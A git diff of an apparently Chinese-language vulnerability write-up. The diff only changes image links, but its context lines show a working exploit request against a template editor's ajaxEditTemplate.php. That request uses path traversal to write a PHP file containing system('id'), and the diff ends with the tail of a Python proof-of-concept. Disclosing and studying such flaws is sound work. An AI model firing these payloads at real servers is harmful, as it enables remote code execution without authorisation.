@@ -122,7 +122,7 @@ $ymlData = Spyc::YAMLLoad($_POST['code']);
     $fullpath = $config_templates_basedir+ .$fileName;
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162243099.png)
+![](./images/202202162243099.png)
 
 ```php
 $filehandle = fopen($fullpath, 'w+');
@@ -149,11 +149,11 @@ Referer: https://176.62.195.243/lib/ajaxHandlers/ajaxEditTemplate.php
 fileName=../www/test.php&code=<?php echo system('id');?>&id=1
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162243006.png)
+![](./images/202202162243006.png)
 
 这里写入文件 **test.php.yml**,并使用 **../** 跳出限制的目录，访问 test.php.yml 实际访问了 test.php，执行id命令
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162243024.png)
+![](./images/202202162243024.png)
 
 ## 漏洞POC
 
@@ -257,4 +257,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162243541.png)
+![](./images/202202162243541.png)
